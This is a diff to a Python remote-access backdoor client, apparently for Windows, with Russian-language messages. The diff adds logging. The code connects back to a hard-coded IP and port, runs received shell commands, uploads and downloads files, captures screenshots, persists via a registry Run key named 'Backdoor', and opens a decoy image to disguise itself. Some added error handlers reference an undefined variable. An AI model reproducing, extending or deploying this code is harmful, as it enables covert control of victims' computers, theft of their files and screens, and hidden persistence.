@@ -10,19 +10,26 @@ import winreg
 import base64
 import requests
 from mss import mss
+import logging
 
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s", filename="client_log.txt", filemode="a")
 
 def reliable_send(data, sock):
-    json_data = json.dumps(data).encode()
-    sock.send(json_data)
-
+    try:
+        json_data = json.dumps(data).encode()
+        sock.send(json_data)
+        logging.info(f"Отправлено: {data}")
+    except Exception as e:
+        logging.error(f"Ошибка при отправке данных: {e}")
 
 def reliable_recv(sock):
     json_data = b""
     while True:
         try:
             json_data += sock.recv(1024)
-            return json.loads(json_data.decode())
+            result = json.loads(json_data.decode())
+            logging.info(f"Получено: {result}")
+            return result
         except ValueError:
             continue
 
@@ -45,8 +52,10 @@ def download(url):
         file_name = url.split("/")[-1]
         with open(file_name, "wb") as out_file:
             out_file.write(get_response.content)
+        logging.info(f"[+] Файл {file_name} успешно скачан!")
         return f"[+] Файл {file_name} успешно скачан!"
     except Exception as e:
+        logging.error(f"[!!] Ошибка скачивания файла: {e}")
         return f"[!!] Ошибка скачивания файла: {e}"
 
 
@@ -55,6 +64,7 @@ def screenshot():
         with mss() as sct:
             screenshot_file = sct.shot(output="screenshot.png")
         with open(screenshot_file, "rb") as screen_file:
+            logging.info("[+] Скриншот успешно создан")
             return base64.b64encode(screen_file.read())
     finally:
         if os.path.exists("screenshot.png"):
@@ -67,10 +77,13 @@ def upload(sock, file_name):
             file_data = base64.b64encode(file.read()).decode
             reliable_send(file_data, sock)
         reliable_send("[+] Файл успешно отправлен", sock)
+        logging.info(f"[+] Файл {file_name} успешно отправлен")
     except FileNotFoundError:
         reliable_send("[!!] Файл не найден", sock)
+        logging.error(f"[!!] Файл {file_name} не найден")
     except Exception as e:
         reliable_send(f"[!!] Ошибка: {e}", sock)
+        logging.error(f"[!!] Ошибка при отправке файла {file_name}: {e}")
 
 
 def save_file(sock, file_name):
@@ -79,8 +92,10 @@ def save_file(sock, file_name):
             file_data = reliable_recv(sock)
             file.write(base64.b64decode(file_data))
         reliable_send("[+] Файл успешно загружен", sock)
+        logging.info(f"[+] Файл {file_name} успешно загружен")
     except Exception as e:
         reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)
+        logging.error(f"[!!] Ошибка загрузки файла {file_name}: {e}")
 
 
 def execute_command(sock, command):
@@ -90,8 +105,10 @@ def execute_command(sock, command):
         )
         result = proc.stdout.read() + proc.stderr.read()
         reliable_send(result.decode(errors="ignore"), sock)
+        logging.info(f"[+] Выполнена команда: {command}")
     except Exception as e:
         reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)
+        logging.error(f"[!!] Ошибка выполнения команды {command}: {e}")
 
 
 def shell(sock):
@@ -100,6 +117,7 @@ def shell(sock):
             command = reliable_recv(sock)
             if command == "q":
                 sock.close()
+                logging.info("[+] Клиент закрыт")
                 sys.exit(0)
                 
             elif command.startswith("cd"):
@@ -137,11 +155,14 @@ def connection():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect(("192.168.178.67", 54321))
+            logging.info("[+] Успешное подключение к серверу")
             shell(sock)
             sock.close()
         except socket.error:
+            logging.error(f"[!!] Ошибка подключения: {e}")
             time.sleep(5)
         except:
+            logging.error(f"[!!] Ошибка в connection: {e}")
             break
 
 
@@ -157,8 +178,8 @@ def setup_autorun():
                 winreg.KEY_SET_VALUE,
             ) as key:
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-        except:
-            pass
+        except Exception as e:
+            logging.error(f"[!!] Ошибка записи в реестр: {e}")
         try:
             if hasattr(sys, "_MEIPASS"):
                 image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
@@ -166,8 +187,9 @@ def setup_autorun():
                 image_path = os.path.join(os.getcwd(), "aaa.jpg")
             if os.path.exists(image_path):
                 subprocess.Popen(["start", image_path], shell=True)
+                logging.info("[+] Картинка открыта при запуске")
         except:
-            pass
+            logging.error(f"[!!] Ошибка открытия картинки: {e}")
 
 
 if __name__ == "__main__":
